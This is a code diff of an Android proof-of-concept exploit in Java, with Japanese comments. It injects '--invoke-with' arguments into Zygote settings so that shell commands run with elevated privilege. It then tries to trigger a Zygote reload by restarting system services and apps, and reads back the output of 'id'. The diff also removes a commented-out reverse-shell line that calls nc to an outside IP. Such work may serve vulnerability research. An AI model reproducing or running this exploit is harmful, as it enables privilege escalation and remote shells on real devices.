@@ -82,11 +82,8 @@ public class ProofActivity extends Activity {
 
             // 2. ペイロード構築
             //    --invoke-with で id コマンドを実行し、結果をファイルに出力
-            //    Android 9 では toybox または busybox が利用可能
             String payload = "L*\n" +
                     "--invoke-with /system/bin/sh -c 'id > /data/local/tmp/zygote_id_output.txt'";
-            // 代替: リバースシェルが必要な場合
-            // String payload = "L*\n--invoke-with /system/bin/sh -c 'nc 192.168.1.100 4444 -e /system/bin/sh'";
 
             MainActivity.appendLog("[+] Payload: " + payload.replace("\n", "\\n"));
 
@@ -108,32 +105,25 @@ public class ProofActivity extends Activity {
 
     /**
      * Zygote 再起動をトリガー
-     * system_server 再起動により Zygote がパラメータを再読み込み
+     * システム再起動を模倣するか、特定アプリを強制再起動
      */
     private void triggerZygoteReload() {
-        MainActivity.appendLog("[*] Triggering Zygote reload via system_server restart...");
+        MainActivity.appendLog("[*] Triggering Zygote reload...");
 
+        // 方法1: stop/start (システム権限が必要だが、プロセスはアプリ権限のままなので失敗する可能性大)
         try {
-            // 方法1: stop/start (システム権限が必要)
-            // 注: このコマンドはシステム権限で実行される必要がある
-            // ProofActivity はシステムから呼ばれているが、プロセス自体はアプリ権限のまま
-            // そのため、このコマンドは失敗する可能性が高い
-            Process process = Runtime.getRuntime().exec(new String[]{
+            java.lang.Process process = Runtime.getRuntime().exec(new String[]{
                     "sh", "-c", "stop && start"
             });
             int exitCode = process.waitFor();
             MainActivity.appendLog("[+] stop/start exit code: " + exitCode);
-
         } catch (Exception e) {
             MainActivity.appendLog("[-] stop/start failed: " + e.getMessage());
-            MainActivity.appendLog("[*] Alternative: Waiting for system to restart Zygote naturally...");
-            MainActivity.appendLog("[*] You may need to restart the target app manually.");
         }
 
-        // 方法2: 特定アプリを強制再起動して Zygote 孵化をトリガー
+        // 方法2: Settings アプリの再起動 (Zygote が新しいプロセスを孵化する)
         try {
-            // Settings アプリを強制停止して再起動
-            Process process = Runtime.getRuntime().exec(new String[]{
+            java.lang.Process process = Runtime.getRuntime().exec(new String[]{
                     "sh", "-c", "am force-stop com.android.settings && am start -n com.android.settings/.Settings"
             });
             int exitCode = process.waitFor();
@@ -142,9 +132,21 @@ public class ProofActivity extends Activity {
             MainActivity.appendLog("[-] Settings restart failed: " + e.getMessage());
         }
 
+        // 方法3: 自前のアプリを再起動して Zygote を呼び出す
+        try {
+            java.lang.Process process = Runtime.getRuntime().exec(new String[]{
+                    "sh", "-c", "am force-stop com.example.tzpoc && am start -n com.example.tzpoc/.MainActivity"
+            });
+            int exitCode = process.waitFor();
+            MainActivity.appendLog("[+] Self restart exit code: " + exitCode);
+        } catch (Exception e) {
+            MainActivity.appendLog("[-] Self restart failed: " + e.getMessage());
+        }
+
+        // 4. 実行結果の確認
         MainActivity.appendLog("[*] Checking for zygote_id_output.txt...");
         try {
-            Process process = Runtime.getRuntime().exec(new String[]{
+            java.lang.Process process = Runtime.getRuntime().exec(new String[]{
                     "sh", "-c", "cat /data/local/tmp/zygote_id_output.txt 2>/dev/null || echo 'File not found'"
             });
             BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
@@ -154,7 +156,8 @@ public class ProofActivity extends Activity {
                 output.append(line).append("\n");
             }
             process.waitFor();
-            MainActivity.appendLog("[+] zygote_id_output.txt content:\n" + output.toString());
+            String content = output.toString().trim();
+            MainActivity.appendLog("[+] zygote_id_output.txt content:\n" + content);
         } catch (Exception e) {
             MainActivity.appendLog("[-] Failed to read zygote output: " + e.getMessage());
         }
